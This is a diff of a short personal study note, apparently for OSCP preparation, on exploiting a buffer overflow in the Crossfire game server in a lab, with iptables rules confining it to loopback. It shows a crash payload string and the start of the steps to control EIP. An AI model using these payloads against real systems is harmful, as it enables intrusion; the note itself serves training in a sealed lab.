@@ -1,28 +1,29 @@
 ---
-title: "Linux Buffer Overflow"
+title: Linux Buffer Overflow
 slug: linux-buffer-overflow
 last_modified_at: 2019-11-01T16:20:02-05:00
-category: OSCP
-tags: Penetration Testing, Buffer Overflow
+category: Certifications
+tags: OSCP
 authors: Daniel Haggerty
 ---
 
-
-
-
 # Linux Buffer Overflow (Crossfire)
+
 Download a version of the vulnerable app Crossfire
+
 ### Setup safe environment: iptables only allow traffic from loopback interface=targetip
 iptables –A, -p, -d, -j # Append, protocol, destination, jump
 crossfire listens on port 13327
 iptables -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP
 iptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP
-### 1. Run debugger and crash the app
+
+1. Run debugger and crash the app
 Get POC code from exploit db
 edb --run /usr/games/crossfire/bin/crossfire. In EDBG: Hit RUN twice
 crash = “\x41” *4379
 buffer = “\x11(setup sound “ + crash + “\x90\x00#”
 python fuzz.py
+
 2. Control EIP
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
 Swap into the crash var: python linux_buffer_overflow.py 
